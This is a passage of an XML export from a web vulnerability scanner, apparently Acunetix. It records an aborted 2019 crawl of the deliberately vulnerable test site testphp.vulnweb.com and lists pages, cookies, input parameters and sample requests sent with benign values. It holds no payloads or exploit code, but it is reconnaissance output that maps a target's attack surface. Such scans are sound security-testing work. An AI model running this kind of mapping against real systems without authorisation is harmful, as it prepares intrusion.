<?xml version="1.0"?>
<ScanGroup ExportedOn="15/5/2019, 14:48">
 <Scan>
  <Name><![CDATA[Scan Thread 1 ( http://testphp.vulnweb.com/ )]]></Name>
  <ShortName><![CDATA[Scan Thread 1]]></ShortName>
  <StartURL><![CDATA[http://testphp.vulnweb.com/]]></StartURL>
  <StartTime><![CDATA[15/5/2019, 14:43:58]]></StartTime>
  <FinishTime><![CDATA[15/5/2019, 14:48:23]]></FinishTime>
  <ScanTime><![CDATA[4 minutes, 26 seconds]]></ScanTime>
  <Aborted><![CDATA[True]]></Aborted>
  <Responsive><![CDATA[True]]></Responsive>
  <Banner><![CDATA[nginx/1.4.1]]></Banner>
  <Os><![CDATA[Unknown]]></Os>
  <WebServer><![CDATA[nginx]]></WebServer>
  <Technologies><![CDATA[PHP]]></Technologies>
  <KBase>
    <KBItem>
     <Name><![CDATA[Possible registration page]]></Name>
     <Text><![CDATA[A page where is possible to register a new user account was found at [dark]/signup.php[/dark].]]></Text>
     <References>
     </References>
    </KBItem>
  </KBase>
  <Crawler StartUrl="http://testphp.vulnweb.com/">
   <Cookies>
     <Variable Name="login" Type="Cookie">
     </Variable>
     <Variable Name="mycookie" Type="Cookie">
     </Variable>
   </Cookies>
   <SiteFiles>
     <SiteFile id="1">
      <Name></Name>
      <URL>/</URL>
      <FullURL>http://testphp.vulnweb.com/</FullURL>
      <Inputs>
       <Variable Name="/Mod_Rewrite_Shop/" Type="Path Fragment (suffix .html)">
       </Variable>
       <Variable Name="-" Type="Path Fragment (suffix .html)">
       </Variable>
       <Variable Name="/Mod_Rewrite_Shop/" Type="Path Fragment (suffix /)">
       </Variable>
       <Variable Name="-" Type="Path Fragment (suffix /)">
       </Variable>
       <Variable Name="/Mod_Rewrite_Shop/" Type="Path Fragment (suffix /)">
       </Variable>
       <Variable Name="/" Type="Path Fragment (suffix /)">
       </Variable>
       <Variable Name="/" Type="Path Fragment (suffix /)">
       </Variable>
       <Variable Name="Host" Type="HTTP Header">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="2">
      <Name>search.php</Name>
      <URL>/search.php</URL>
      <FullURL>http://testphp.vulnweb.com/search.php</FullURL>
      <Inputs>
       <Variable Name="test" Type="URL encoded GET">
       </Variable>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="searchFor" Type="URL encoded POST">
       </Variable>
       <Variable Name="test" Type="URL encoded GET">
       </Variable>
       <Variable Name="searchFor" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/search.php?test=query</URL>
         <PostData><![CDATA[goButton=go&amp;searchFor=]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/search.php?test=query</URL>
         <PostData><![CDATA[goButton=go&amp;searchFor=the]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="3">
      <Name>hpp</Name>
      <URL>/hpp/</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/</FullURL>
      <Inputs>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/?pp=12</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="4">
      <Name>params.php</Name>
      <URL>/hpp/params.php</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/params.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded GET">
       </Variable>
       <Variable Name="p" Type="URL encoded GET">
       </Variable>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
       <Variable Name="aaaa" Type="URL encoded GET">
       </Variable>
       <Variable Name="p" Type="URL encoded GET">
       </Variable>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/params.php?aaaa=</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=12</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="5">
      <Name>index.php</Name>
      <URL>/hpp/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/index.php</FullURL>
      <Inputs>
       <Variable Name="pp" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/hpp/index.php?pp=12</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="6">
      <Name>test.php</Name>
      <URL>/hpp/test.php</URL>
      <FullURL>http://testphp.vulnweb.com/hpp/test.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="7">
      <Name>cart.php</Name>
      <URL>/cart.php</URL>
      <FullURL>http://testphp.vulnweb.com/cart.php</FullURL>
      <Inputs>
       <Variable Name="addcart" Type="URL encoded POST">
       </Variable>
       <Variable Name="price" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=3&amp;price=986]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=1&amp;price=500]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/cart.php</URL>
         <PostData><![CDATA[addcart=2&amp;price=800]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="8">
      <Name>index.php</Name>
      <URL>/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="9">
      <Name>login.php</Name>
      <URL>/login.php</URL>
      <FullURL>http://testphp.vulnweb.com/login.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="10">
      <Name>style.css</Name>
      <URL>/style.css</URL>
      <FullURL>http://testphp.vulnweb.com/style.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="11">
      <Name>artists.php</Name>
      <URL>/artists.php</URL>
      <FullURL>http://testphp.vulnweb.com/artists.php</FullURL>
      <Inputs>
       <Variable Name="artist" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/artists.php?artist=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="12">
      <Name>privacy.php</Name>
      <URL>/privacy.php</URL>
      <FullURL>http://testphp.vulnweb.com/privacy.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="13">
      <Name>userinfo.php</Name>
      <URL>/userinfo.php</URL>
      <FullURL>http://testphp.vulnweb.com/userinfo.php</FullURL>
      <Inputs>
       <Variable Name="pass" Type="URL encoded POST">
       </Variable>
       <Variable Name="uname" Type="URL encoded POST">
       </Variable>
       <Variable Name="uname" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/userinfo.php</URL>
         <PostData><![CDATA[pass=g00dPa%24%24w0rD&amp;uname=clpjevvr]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="14">
      <Name>guestbook.php</Name>
      <URL>/guestbook.php</URL>
      <FullURL>http://testphp.vulnweb.com/guestbook.php</FullURL>
      <Inputs>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="text" Type="URL encoded POST">
       </Variable>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="name" Type="URL encoded POST">
       </Variable>
       <Variable Name="text" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/guestbook.php</URL>
         <PostData><![CDATA[submit=add%20message&amp;name=anonymous%20user&amp;text=1]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="15">
      <Name>categories.php</Name>
      <URL>/categories.php</URL>
      <FullURL>http://testphp.vulnweb.com/categories.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="16">
      <Name>Flash</Name>
      <URL>/Flash/</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="17">
      <Name>add.swf</Name>
      <URL>/Flash/add.swf</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/add.swf</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="18">
      <Name>add.fla</Name>
      <URL>/Flash/add.fla</URL>
      <FullURL>http://testphp.vulnweb.com/Flash/add.fla</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="19">
      <Name>AJAX</Name>
      <URL>/AJAX/</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="20">
      <Name>index.php</Name>
      <URL>/AJAX/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="21">
      <Name>styles.css</Name>
      <URL>/AJAX/styles.css</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/styles.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="22">
      <Name>artists.php</Name>
      <URL>/AJAX/artists.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/artists.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="23">
      <Name>titles.php</Name>
      <URL>/AJAX/titles.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/titles.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="24">
      <Name>categories.php</Name>
      <URL>/AJAX/categories.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/categories.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="25">
      <Name>showxml.php</Name>
      <URL>/AJAX/showxml.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/showxml.php</FullURL>
      <Inputs>
       <Variable Name="text/xml" Type="Custom POST">
       </Variable>
       <Variable Name="xml.node:name" Type="XML">
       </Variable>
       <Variable Name="xml.node#text" Type="XML">
       </Variable>
       <Variable Name="xml.node:name" Type="XML">
       </Variable>
       <Variable Name="xml.node#text" Type="XML">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/showxml.php</URL>
         <PostData><![CDATA[&lt;xml&gt;&lt;node name=&quot;nodename1&quot;&gt;nodetext1&lt;/node&gt;&lt;node name=&quot;nodename2&quot;&gt;nodetext2&lt;/node&gt;&lt;/xml&gt;]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="26">
      <Name>infoartist.php</Name>
      <URL>/AJAX/infoartist.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infoartist.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infoartist.php?id=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="27">
      <Name>infocateg.php</Name>
      <URL>/AJAX/infocateg.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infocateg.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infocateg.php?id=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="28">
      <Name>infotitle.php</Name>
      <URL>/AJAX/infotitle.php</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/infotitle.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=1]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=2]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/AJAX/infotitle.php</URL>
         <PostData><![CDATA[id=3]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="29">
      <Name>htaccess.conf</Name>
      <URL>/AJAX/htaccess.conf</URL>
      <FullURL>http://testphp.vulnweb.com/AJAX/htaccess.conf</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="30">
      <Name>disclaimer.php</Name>
      <URL>/disclaimer.php</URL>
      <FullURL>http://testphp.vulnweb.com/disclaimer.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="31">
      <Name>images</Name>
      <URL>/images/</URL>
      <FullURL>http://testphp.vulnweb.com/images/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="32">
      <Name>Mod_Rewrite_Shop</Name>
      <URL>/Mod_Rewrite_Shop/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="33">
      <Name>images</Name>
      <URL>/Mod_Rewrite_Shop/images/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="34">
      <Name>Details</Name>
      <URL>/Mod_Rewrite_Shop/Details</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="35">
      <Name>color-printer</Name>
      <URL>/Mod_Rewrite_Shop/Details/color-printer</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="36">
      <Name>3</Name>
      <URL>/Mod_Rewrite_Shop/Details/color-printer/3/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="37">
      <Name>web-camera-a4tech</Name>
      <URL>/Mod_Rewrite_Shop/Details/web-camera-a4tech</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="38">
      <Name>2</Name>
      <URL>/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="39">
      <Name>network-attached-storage-dlink</Name>
      <URL>/Mod_Rewrite_Shop/Details/network-attached-storage-dlink</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="40">
      <Name>1</Name>
      <URL>/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="41">
      <Name>BuyProduct-3</Name>
      <URL>/Mod_Rewrite_Shop/BuyProduct-3/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="42">
      <Name>RateProduct-3.html</Name>
      <URL>/Mod_Rewrite_Shop/RateProduct-3.html</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="43">
      <Name>BuyProduct-2</Name>
      <URL>/Mod_Rewrite_Shop/BuyProduct-2/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="44">
      <Name>RateProduct-2.html</Name>
      <URL>/Mod_Rewrite_Shop/RateProduct-2.html</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="45">
      <Name>BuyProduct-1</Name>
      <URL>/Mod_Rewrite_Shop/BuyProduct-1/</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="46">
      <Name>RateProduct-1.html</Name>
      <URL>/Mod_Rewrite_Shop/RateProduct-1.html</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="47">
      <Name>.htaccess</Name>
      <URL>/Mod_Rewrite_Shop/.htaccess</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/.htaccess</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="48">
      <Name>buy.php</Name>
      <URL>/Mod_Rewrite_Shop/buy.php</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="49">
      <Name>details.php</Name>
      <URL>/Mod_Rewrite_Shop/details.php</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="50">
      <Name>index.php</Name>
      <URL>/Mod_Rewrite_Shop/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="51">
      <Name>rate.php</Name>
      <URL>/Mod_Rewrite_Shop/rate.php</URL>
      <FullURL>http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php</FullURL>
      <Inputs>
       <Variable Name="id" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="52">
      <Name>product.php</Name>
      <URL>/product.php</URL>
      <FullURL>http://testphp.vulnweb.com/product.php</FullURL>
      <Inputs>
       <Variable Name="pic" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/product.php?pic=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="53">
      <Name>showimage.php</Name>
      <URL>/showimage.php</URL>
      <FullURL>http://testphp.vulnweb.com/showimage.php</FullURL>
      <Inputs>
       <Variable Name="file" Type="URL encoded GET">
       </Variable>
       <Variable Name="file" Type="URL encoded GET">
       </Variable>
       <Variable Name="size" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&amp;size=160</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="54">
      <Name>listproducts.php</Name>
      <URL>/listproducts.php</URL>
      <FullURL>http://testphp.vulnweb.com/listproducts.php</FullURL>
      <Inputs>
       <Variable Name="cat" Type="URL encoded GET">
       </Variable>
       <Variable Name="artist" Type="URL encoded GET">
       </Variable>
       <Variable Name="artist" Type="URL encoded GET">
       </Variable>
       <Variable Name="cat" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?cat=4</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=1</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=2</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/listproducts.php?artist=3</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="55">
      <Name>signup.php</Name>
      <URL>/signup.php</URL>
      <FullURL>http://testphp.vulnweb.com/signup.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="56">
      <Name>crossdomain.xml</Name>
      <URL>/crossdomain.xml</URL>
      <FullURL>http://testphp.vulnweb.com/crossdomain.xml</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="57">
      <Name>redir.php</Name>
      <URL>/redir.php</URL>
      <FullURL>http://testphp.vulnweb.com/redir.php</FullURL>
      <Inputs>
       <Variable Name="r" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="58">
      <Name>Templates</Name>
      <URL>/Templates/</URL>
      <FullURL>http://testphp.vulnweb.com/Templates/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="59">
      <Name>main_dynamic_template.dwt.php</Name>
      <URL>/Templates/main_dynamic_template.dwt.php</URL>
      <FullURL>http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="60">
      <Name>secured</Name>
      <URL>/secured/</URL>
      <FullURL>http://testphp.vulnweb.com/secured/</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="61">
      <Name>newuser.php</Name>
      <URL>/secured/newuser.php</URL>
      <FullURL>http://testphp.vulnweb.com/secured/newuser.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded POST">
       </Variable>
       <Variable Name="uaddress" Type="URL encoded POST">
       </Variable>
       <Variable Name="ucc" Type="URL encoded POST">
       </Variable>
       <Variable Name="uemail" Type="URL encoded POST">
       </Variable>
       <Variable Name="upass" Type="URL encoded POST">
       </Variable>
       <Variable Name="upass2" Type="URL encoded POST">
       </Variable>
       <Variable Name="uphone" Type="URL encoded POST">
       </Variable>
       <Variable Name="urname" Type="URL encoded POST">
       </Variable>
       <Variable Name="uuname" Type="URL encoded POST">
       </Variable>
       <Variable Name="signup" Type="URL encoded POST">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/secured/newuser.php</URL>
         <PostData><![CDATA[signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=pmkxcfae&amp;uuname=vvensyon]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="62">
      <Name>style.css</Name>
      <URL>/secured/style.css</URL>
      <FullURL>http://testphp.vulnweb.com/secured/style.css</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="63">
      <Name>database_connect.php</Name>
      <URL>/secured/database_connect.php</URL>
      <FullURL>http://testphp.vulnweb.com/secured/database_connect.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="64">
      <Name>index.php</Name>
      <URL>/secured/index.php</URL>
      <FullURL>http://testphp.vulnweb.com/secured/index.php</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="65">
      <Name>office.htm</Name>
      <URL>/secured/office.htm</URL>
      <FullURL>http://testphp.vulnweb.com/secured/office.htm</FullURL>
      <Inputs>
      </Inputs>
      <Variations>
      </Variations>
     </SiteFile>
     <SiteFile id="66">
      <Name>phpinfo.php</Name>
      <URL>/secured/phpinfo.php</URL>
      <FullURL>http://testphp.vulnweb.com/secured/phpinfo.php</FullURL>
      <Inputs>
       <Variable Name="" Type="URL encoded GET">
       </Variable>
      </Inputs>
      <Variations>
        <Variation>
         <URL>http://testphp.vulnweb.com/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
        <Variation>
         <URL>http://testphp.vulnweb.com/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42</URL>
         <PostData><![CDATA[]]></PostData>
        </Variation>
      </Variations>
     </SiteFile>
     <SiteFile id="67">
      <Name>office_files</Name>
      <URL>/secured/office_files</URL>
